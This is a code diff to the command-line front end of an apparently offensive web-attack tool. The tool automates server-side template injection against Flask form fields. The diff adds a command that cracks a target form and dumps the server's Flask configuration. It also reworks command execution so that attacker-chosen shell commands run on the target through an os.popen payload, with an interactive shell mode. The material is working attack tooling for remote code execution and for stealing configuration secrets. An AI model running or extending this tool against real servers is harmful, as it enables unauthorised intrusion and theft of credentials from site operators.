@@ -6,8 +6,10 @@ from functools import partial
 
 from .form import Form
 from .form_cracker import FormCracker
+from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
-from .requester import Requester, DEFAULT_USER_AGENT
+from .requester import Requester
+from .const import DEFAULT_USER_AGENT, OS_POPEN_READ, CONFIG
 from .colorize import colored
 import click
 
@@ -28,8 +30,8 @@ logging.basicConfig(
 logger = logging.getLogger("cli")
 
 
-def cmd_exec(cmd, cracker: FormCracker, field: str, payload_gen: Callable):
-    payload = payload_gen(cmd)
+def cmd_exec(cmd, cracker: FormCracker, field: str, full_payload_gen: FullPayloadGen):
+    payload = full_payload_gen.generate(OS_POPEN_READ, cmd)
     logger.info(f"Submit payload {colored('blue', payload)}")
     r = cracker.submit(
         {field: payload})
@@ -68,6 +70,52 @@ def main():
 @click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
 @click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
 @click.option("--inputs", "-i", help="form的参数，以逗号分隔")
+@click.option("--interval", default=0.0, help="每次请求的间隔")
+@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
+def get_config(
+        url: str,
+        action: str,
+        method: str,
+        inputs: str,
+        interval: float,
+        user_agent: str):
+    """
+    攻击指定的表单，并获得目标服务器的flask config
+    """
+    print(TITLE)
+    assert all(param is not None for param in [
+               url, inputs]), "Please check your param"
+    form = Form(
+        action=action or urlparse(url).path,
+        method=method,
+        inputs=inputs.split(",")
+    )
+    requester = Requester(
+        interval=interval,
+        user_agent=user_agent
+    )
+    cracker = FormCracker(
+        url=url,
+        form=form,
+        requester=requester
+    )
+    result = cracker.crack()
+    if result is None:
+        logger.warning("Test form failed...")
+        return
+    full_payload_gen, field = result
+    payload = full_payload_gen.generate(CONFIG)
+    r = cracker.submit(
+        {field: payload})
+    
+    print(r.text if r is not None else None)
+    logger.warning("Bye!")
+
+@main.command()
+@click.option("--url", "-u", help="form所在的URL")
+@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
+@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
+@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
 @click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
 @click.option("--interval", default=0.0, help="每次请求的间隔")
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@@ -90,20 +138,22 @@ def crack(
         method=method,
         inputs=inputs.split(",")
     )
-    requester = Requester(interval=interval, user_agent=user_agent)
-    cracker = FormCracker(url=url, form=form, requester=requester)
+    requester = Requester(
+        interval=interval,
+        user_agent=user_agent
+    )
+    cracker = FormCracker(
+        url=url,
+        form=form,
+        requester=requester
+    )
     result = cracker.crack()
     if result is None:
         logger.warning("Test form failed...")
         return
-    payload_gen, field = result
+    full_payload_gen, field = result
     cmd_exec_func = partial(cmd_exec, cracker=cracker,
-                            field=field, payload_gen=payload_gen)
-    # def cmd_exec_func(cmd):
-    #     r = cracker.submit(
-    #         {field: payload_gen(cmd)})
-    #     assert r is not None
-    #     return r.text
+                            field=field, full_payload_gen=full_payload_gen)
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
@@ -128,9 +178,9 @@ def scan(url, exec_cmd, interval, user_agent):
             result = cracker.crack()
             if result is None:
                 continue
-            payload_gen, field = result
+            full_payload_gen, field = result
             cmd_exec_func = partial(cmd_exec, cracker=cracker,
-                                    field=field, payload_gen=payload_gen)
+                                    field=field, full_payload_gen=full_payload_gen)
             # def cmd_exec_func(cmd):
             #     r = cracker.submit(
             #         {field: payload_gen(cmd)})
